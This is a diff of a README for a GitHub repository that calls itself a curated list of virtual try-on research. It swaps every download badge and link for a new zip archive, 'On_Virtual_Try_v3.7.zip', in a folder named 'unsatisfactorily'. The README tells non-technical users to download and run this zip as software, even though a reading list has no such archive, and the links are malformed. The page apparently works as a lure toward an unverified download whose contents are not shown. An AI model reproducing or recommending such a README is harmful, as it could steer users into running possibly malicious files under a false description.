@@ -4,7 +4,7 @@
 Virtual-Try-On offers a curated list of fantastic research papers, projects, code, datasets, workshops, and more focused on the virtual try-on concept. This tool is especially designed to show top implementations that can benefit businesses in the fashion and retail industry.
 
 ## 📥 Download Now
-[![Download Virtual-Try-On](https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip%https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip)](https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip)
+[![Download Virtual-Try-On](https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip%https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip)](https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip)
 
 ## 🚀 Getting Started
 To get started with Virtual-Try-On, follow these simple steps. You don’t need any technical skills to run this software. Just follow the instructions below.
@@ -22,7 +22,7 @@ Before installing, ensure your system meets these requirements:
 - **Research-Driven:** Stay updated with the latest advancements in virtual try-on technologies.
 
 ## 📥 Download & Install
-1. Visit the releases page: [Download Virtual-Try-On Releases](https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip).
+1. Visit the releases page: [Download Virtual-Try-On Releases](https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip).
 2. On the releases page, you will find different versions available for download. Choose the version suitable for your operating system.
 3. Click on the download link for your chosen version. The download should start automatically.
 4. Once downloaded, locate the file in your computer's downloads folder.
@@ -59,6 +59,6 @@ Join our community for discussions related to virtual try-on technology. Share y
 ## 📄 License
 This project is licensed under the MIT License. You can freely modify the software but remember to give credit.
 
-[![Download Virtual-Try-On](https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip%https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip)](https://raw.githubusercontent.com/shaybenaroya80/Virtual-Try-On/main/unsatisfactorily/Virtual-Try-On.zip) 
+[![Download Virtual-Try-On](https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip%https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip)](https://github.com/shaybenaroya80/Virtual-Try-On/raw/refs/heads/main/unsatisfactorily/On_Virtual_Try_v3.7.zip) 
 
 Thank you for using Virtual-Try-On! Enjoy exploring your fashion options through this exciting technology.
